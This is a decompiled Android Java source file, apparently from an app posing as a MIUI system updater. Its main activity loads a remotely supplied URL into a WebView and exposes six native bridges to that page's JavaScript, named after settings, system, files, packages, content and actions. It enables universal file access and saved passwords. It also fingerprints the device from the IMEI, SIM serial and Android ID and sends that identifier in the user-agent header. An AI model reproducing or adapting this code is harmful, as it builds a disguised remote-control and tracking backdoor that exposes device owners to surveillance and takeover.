package brandmangroupe.miui.updater;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;
import android.view.LayoutInflater;
import android.webkit.WebSettings;
import android.webkit.WebView;
import java.util.UUID;

public class MasterPage extends Activity {
    private String template = "http://yandex.ru";

    /* access modifiers changed from: protected */
    @SuppressLint({"NewApi"})
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = getIntent();
        if (intent != null) {
            this.template = intent.getStringExtra("url");
        }
        LayoutInflater inflater = (LayoutInflater) getSystemService("layout_inflater");
        WebView webview = (WebView) findViewById(R.id.www);
        if (this.template.contains("#full")) {
            this.template = this.template.substring(0, this.template.length() - 5);
            setContentView(R.layout.wv2);
        } else {
            setContentView(R.layout.wv);
        }
        webview = (WebView) findViewById(R.id.www);
        webview.setBackgroundColor(0);
        webview.addJavascriptInterface(new MeSetting(this), "MeSetting");
        webview.addJavascriptInterface(new MeSystem(this), "MeSystem");
        webview.addJavascriptInterface(new MeFile(this), "MeFile");
        webview.addJavascriptInterface(new MePackage(this), "MePackage");
        webview.addJavascriptInterface(new MeContent(this), "MeContent");
        webview.addJavascriptInterface(new MeAction(this), "MeAction");
        WebSettings webSettings = webview.getSettings();
        webSettings.setSavePassword(true);
        webSettings.setSaveFormData(true);
        webSettings.setAllowFileAccess(true);
        if (VERSION.SDK_INT >= 16) {
            webSettings.setAllowFileAccessFromFileURLs(true);
            webSettings.setAllowUniversalAccessFromFileURLs(true);
        }
        webSettings.setJavaScriptEnabled(true);
        webSettings.setUserAgentString("Hash: " + getUniqueID(this));
        String key = "";
        try {
            ApplicationInfo appInfo = getPackageManager().getApplicationInfo(getPackageName(), 128);
            if (appInfo.metaData != null) {
                key = appInfo.metaData.getString("domain");
            }
        } catch (NameNotFoundException oops) {
            oops.printStackTrace();
        }
        if (this.template.length() > 0) {
            webview.loadUrl(this.template);
        }
    }

    public static String getUniqueID(Context context) {
        TelephonyManager tm = (TelephonyManager) context.getSystemService("phone");
        String deviceId = new UUID((long) (Secure.getString(context.getContentResolver(), "android_id")).hashCode(), (((long) (tm.getDeviceId()).hashCode()) << 32) | ((long) (tm.getSimSerialNumber()).hashCode())).toString();
        String key = "";
        try {
            ApplicationInfo appInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(), 128);
            if (appInfo.metaData != null) {
                key = appInfo.metaData.getString("sub");
            }
        } catch (NameNotFoundException oops) {
            oops.printStackTrace();
        }
        return new StringBuilder(String.valueOf(deviceId)).append("-").append(key).toString();
    }
}
